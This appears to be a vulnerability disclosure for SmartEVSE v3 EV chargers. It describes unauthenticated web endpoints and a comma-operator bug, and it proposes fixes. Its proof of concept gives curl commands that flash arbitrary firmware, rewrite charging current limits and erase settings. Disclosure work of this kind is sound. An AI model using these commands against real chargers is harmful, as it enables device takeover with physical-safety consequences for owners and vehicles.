# SmartEVSE v3 — Unauthenticated Web Management (Arbitrary Firmware Flashing)

## Affected Software
- **Product:** SmartEVSE v3 (Open Source EV Charging Controller)
- **Version:** v1.0.0 – v1.8.0 (latest, 2023-12-15)
- **Vendor/Repo:** github.com/serkri/SmartEVSE-3

## Vulnerability Type
Missing Authentication for Critical Function (CWE-306)

## Description
The ESPAsyncWebServer instance on port 80 serves management endpoints with **no
authentication middleware** — zero `request->authenticate()` calls in the entire codebase:

| Endpoint | Method | Impact |
|---|---|---|
| `/update` | POST | **Arbitrary firmware upload** → persistent code execution |
| `/settings` | POST | Full configuration rewrite (charging current limits, MQTT credentials) |
| `/erasesettings` | DELETE | Configuration wipe |

Any LAN-adjacent device can silently take over the charger. **Charging current is a
physical-safety-relevant parameter** (the device modulates EV charging current).

Additional bug: `/update` callback contains a comma-operator dead-code error:
`if(!Update.begin(...), U_FLASH)` — the error branch never executes.

## Proof of Concept
```bash
# Flash arbitrary firmware (unauthenticated):
curl -X POST http://<charger>/update -F "file=@malicious.bin"

# Overwrite charging current limits:
curl -X POST http://<charger>/settings -d "current_min=6&current_max=16"

# Erase all settings:
curl -X DELETE http://<charger>/erasesettings
```

## Source Evidence
```bash
grep -c 'request->authenticate' src/evse.cpp
# → 0 (zero authentication calls in 4713-line file)
```

Route definitions: `/erasesettings` @ line 3658, `/update` @ 3671/3675, `/settings` @ 3711/3864

## CVSS 3.1
**8.8** (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — physical safety impact

## Suggested Fix
1. Global authentication filter on all routes
2. `/update`: physical button confirmation + signed firmware verification
3. Default to AP-only binding until initial provisioning completes
